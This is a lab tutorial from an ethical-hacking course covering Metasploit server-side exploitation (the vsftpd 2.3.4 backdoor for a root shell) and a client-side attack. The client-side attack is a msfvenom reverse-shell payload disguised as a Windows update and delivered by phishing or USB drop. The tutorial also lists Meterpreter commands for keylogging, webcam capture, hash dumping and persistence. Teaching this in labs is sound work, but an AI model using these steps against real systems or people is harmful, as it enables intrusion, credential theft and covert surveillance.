# Day 17 — Exploitation: Server-Side & Client-Side Attacks with Metasploit

> 📚 Part of the **"Learn Ethical Hacking in 30 Days"** series.  
> Previous: [Day 16 — Metasploit Framework](#) | Next: [Day 18](#)

---

## 📋 Table of Contents

1. [Client-Server Model](#1-client-server-model)
2. [Types of Attacks: Server-Side vs Client-Side](#2-types-of-attacks-server-side-vs-client-side)
3. [Practical: Server-Side Attack (vsftpd Backdoor)](#3-practical-server-side-attack-vsftpd-backdoor)
4. [Practical: Client-Side Attack (msfvenom Payload)](#4-practical-client-side-attack-msfvenom-payload)
5. [Post-Exploitation with Meterpreter](#5-post-exploitation-with-meterpreter)
6. [Attack Comparison Summary](#6-attack-comparison-summary)
7. [Quick Reference Cheat Sheet](#7-quick-reference-cheat-sheet)

---

## 1. Client-Server Model

Before understanding attack types, you need to understand the **client-server model**.

```
[Client: Phone / PC / Laptop]
         |
         | sends request
         ▼
   [ Network / Internet ]
         |
         | response
         ▼
     [Server]
```

| Role | What it does | Example |
|------|-------------|---------|
| **Client** | Requests information or services | Your browser requesting a webpage |
| **Server** | Responds to requests, serves data | Web server sending the page back |

> 💡 These roles are **interchangeable** — your laptop is a client when browsing, but becomes a server if you're hosting a file for someone else to download.

**Simple rule:**
- **Server** = the one that *serves* (provides data)
- **Client** = the one that *requests* (asks for data)

---

## 2. Types of Attacks: Server-Side vs Client-Side

### Server-Side Attacks

You directly attack the **server** by exploiting a vulnerability in a service running on it.

```
[Attacker] ──exploit──▶ [Vulnerable Server]
                          (vsftpd, Apache, SMB, etc.)
```

**Characteristics:**
- Target is the server itself
- Use known **CVEs and exploits** against outdated/vulnerable services
- No user interaction needed on target side
- Requires finding open ports + vulnerable service versions (via nmap)

**Primary tools:** Metasploit exploit modules, searchsploit

---

### Client-Side Attacks

You attack the **user/client** by getting them to execute your payload.

```
[Attacker] ──malicious file──▶ [Victim User]
                                (opens file → shell connects back)
```

**Characteristics:**
- Target is the end user, not the server
- Requires **social engineering** to get the user to execute the payload
- Payload delivered via phishing email, malicious PDF, fake update, USB drop, etc.
- Exploits can be application-specific (Adobe Acrobat, VLC, browser) or generic (custom msfvenom payload)

**Primary tools:** msfvenom (payload generation) + multi/handler (listener)

---

### Comparison Table

| Aspect | Server-Side Attack | Client-Side Attack |
|--------|-------------------|-------------------|
| **Target** | Server / service | End user / client machine |
| **Requires user interaction?** | ❌ No | ✅ Yes (user must execute payload) |
| **Primary weapon** | Known exploits (CVEs) | Malware / payloads |
| **Finding entry point** | nmap version scan → searchsploit | Social engineering / phishing |
| **Example** | vsftpd backdoor exploit | Fake Windows Update .exe |
| **Detection difficulty** | Depends on IDS/firewall | Depends on AV/EDR |

---

## 3. Practical: Server-Side Attack (vsftpd Backdoor)

**Target:** Metasploitable 2 (`192.168.29.150`)  
**Attacker:** Kali Linux (`192.168.29.10`)

---

### Step 1: Scan for open ports and service versions

```bash
sudo nmap -sS -sV 192.168.29.150
```

**Key findings from output:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4     ← vulnerable!
22/tcp open  ssh     OpenSSH 4.7p1
80/tcp open  http    Apache httpd 2.2.8
...
```

> 💡 `.rb` file extension in search results = Metasploit Ruby exploit module

---

### Step 2: Search for the exploit

```bash
msfconsole

search vsftpd 2.3.4
```

**Output:**
```
   #  Name                                  Disclosure Date  Rank       Description
   -  ----                                  ---------------  ----       -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
```

---

### Step 3: Load and configure the exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
# or
use 0

options
```

**Options output:**
```
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   21               yes       The target port (default: 21)
```

```bash
set RHOSTS 192.168.29.150
options    # verify it's set
```

> 💡 **Note on RPORT:** Default port for FTP is 21. If the service runs on a non-default port (e.g., 8000, 3333), update RPORT to match what nmap found.

---

### Step 4: Run the exploit

```bash
exploit
```

**Output:**
```
[*] Banner: 220 (vsFTPd 2.3.4)
[*] USER: 331 Please specify the password.
[+] Backdoor service has been spawned, handling...
[+] UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened
```

---

### Step 5: Verify access

```bash
whoami        # root
id            # uid=0(root) gid=0(root)
ls /          # list root filesystem
```

✅ **Full root access on the target server achieved.**

---

### Server-Side Attack Summary

```
1. nmap -sS -sV <target>          → find open ports + versions
2. msfconsole                      → start Metasploit
3. search <service> <version>      → find exploit
4. use <exploit>                   → load it
5. set RHOSTS <target-ip>          → set target
6. exploit                         → fire!
```

---

## 4. Practical: Client-Side Attack (msfvenom Payload)

**Scenario:** Target = Windows 10 machine. We create a fake "Windows Update" payload and deliver it to the victim.

---

### Step 1: Generate the payload with msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.29.10 \
  LPORT=6677 \
  -f exe \
  -o win_update.exe
```

| Flag | Value | Meaning |
|------|-------|---------|
| `-p` | `windows/meterpreter/reverse_tcp` | Windows Meterpreter staged payload |
| `LHOST` | `192.168.29.10` | Attacker's IP (victim connects back here) |
| `LPORT` | `6677` | Attacker's listening port |
| `-f exe` | `exe` | Windows executable format |
| `-o` | `win_update.exe` | Output filename (social engineering name) |

**Output:**
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: win_update.exe
```

> 💡 **Social engineering tip:** Naming the file `win_update.exe` makes it look like a legitimate Windows update to unsuspecting users.

---

### Step 2: Set up the listener (multi/handler)

> ✅ **Always start the listener BEFORE delivering the payload.**

```bash
msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.29.10
set LPORT 6677

exploit
```

**Output:**
```
[*] Started reverse TCP handler on 192.168.29.10:6677
```

Now waiting for the victim to execute the payload.

---

### Step 3: Serve and deliver the payload

Use Python's built-in HTTP server to host the file:

```bash
# In a new terminal, navigate to where win_update.exe is
cd /path/to/payload/

# Start HTTP server on port 8000
python3 -m http.server 8000
```

Now the victim can download it from:
```
http://192.168.29.10:8000/win_update.exe
```

**Delivery methods (social engineering):**
- Phishing email with download link
- USB drop
- Fake update page
- Malicious attachment (embed in PDF, image, etc.)

---

### Step 4: Catch the connection

When the victim runs `win_update.exe`, the multi/handler catches the reverse connection:

```
[*] Sending stage (175686 bytes) to 192.168.29.150
[*] Meterpreter session 1 opened (192.168.29.10:6677 → 192.168.29.150:49832)

meterpreter >
```

✅ **Meterpreter session established on the victim's Windows machine.**

---

### Why Windows SmartScreen appears

When the victim runs the file, Windows SmartScreen may show a warning:  
*"Unknown Publisher — Windows protected your PC"*

**Reason:** The binary is not signed by a known vendor/certificate.  
**Bypass (for testing):** Click **More info** → **Run anyway**

> 🔴 **Note:** In real red team engagements, bypassing AV/EDR (Windows Defender, SmartScreen) is a separate advanced topic involving payload obfuscation, code signing, and custom loaders. For learning purposes, test in a lab with AV disabled.

---

## 5. Post-Exploitation with Meterpreter

Once you have a Meterpreter session, here are useful commands:

### System Information

```bash
sysinfo          # OS, computer name, architecture, domain, logged-on users
getuid           # Current user
getpid           # Current process ID
```

**Example sysinfo output:**
```
Computer        : VICTIM-PC
OS              : Windows 10 (Build 19041)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

### Navigation

```bash
pwd              # Current directory on target
ls               # List files in current directory
cd <path>        # Change directory
cat <file>       # Read file contents
download <file>  # Download file to attacker machine
upload <file>    # Upload file to target
```

### Screenshots & Webcam

```bash
screenshot       # Take screenshot of victim's desktop (saves locally)
webcam_snap      # Take photo from victim's webcam
webcam_stream    # Stream victim's webcam live
```

### Keylogging

```bash
keyscan_start    # Start recording keystrokes
keyscan_dump     # Dump recorded keystrokes
keyscan_stop     # Stop keylogger
```

### Privilege Escalation

```bash
getsystem        # Attempt to get SYSTEM privileges
getuid           # Verify current privilege level
```

### Persistence & Pivoting

```bash
run post/windows/manage/persistence   # Install persistent backdoor
run post/multi/recon/local_exploit_suggester  # Find local privesc exploits
```

### Password Dumping

```bash
hashdump         # Dump Windows password hashes (requires SYSTEM)
run post/windows/gather/credentials/credential_collector
```

### Session Management

```bash
background       # Background current session
sessions         # List all active sessions
sessions -i 1    # Re-interact with session 1
```

### Help

```bash
help             # Show all available Meterpreter commands
```

---

## 6. Attack Comparison Summary

```
SERVER-SIDE ATTACK FLOW:
─────────────────────────
nmap scan → find open port + version
        ↓
searchsploit / msfconsole search → find CVE exploit
        ↓
use <exploit> → set RHOSTS → exploit
        ↓
Shell / Meterpreter on server (no user interaction needed)


CLIENT-SIDE ATTACK FLOW:
─────────────────────────
msfvenom → generate payload (.exe, .pdf, etc.)
        ↓
multi/handler → start listener
        ↓
deliver payload → phishing / USB / fake page
        ↓
victim executes file → Meterpreter session opens
```

---

## 7. Quick Reference Cheat Sheet

### Server-Side Attack (Full Flow)
```bash
# 1. Scan
sudo nmap -sS -sV <target-ip>

# 2. Start Metasploit
msfconsole

# 3. Find exploit
search <service> <version>

# 4. Load, configure, fire
use <exploit-module>
set RHOSTS <target-ip>
exploit
```

### Client-Side Attack (Full Flow)
```bash
# 1. Generate payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<your-ip> LPORT=<port> -f exe -o payload.exe

# 2. Start listener
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT <port>
exploit

# 3. Serve payload
python3 -m http.server 8000

# 4. Deliver → wait for meterpreter session
```

### Key Meterpreter Commands
```bash
sysinfo          # System info
getuid           # Current user
screenshot       # Take screenshot
keyscan_start    # Start keylogger
keyscan_dump     # Dump keystrokes
hashdump         # Dump password hashes
getsystem        # Escalate to SYSTEM
download <file>  # Download file from target
background       # Background session
sessions -i 1    # Reconnect to session
help             # All commands
```

### Common RPORT Values
```
FTP   → 21
SSH   → 22
HTTP  → 80, 8000, 8080, 8888, 3333
HTTPS → 443
SMB   → 445
RDP   → 3389
MySQL → 3306
```

---

> ✅ **End of Day 17 Notes**  
> 📌 Next up: **Post-Exploitation** — what to do after getting a shell  
> 💡 Practice: Exploit vsftpd on Metasploitable 2, then try the msfvenom payload on a Windows VM  
> ⚠️ Only test on machines you own or have explicit written permission to attack  
> 💬 Questions? Drop them in the comments!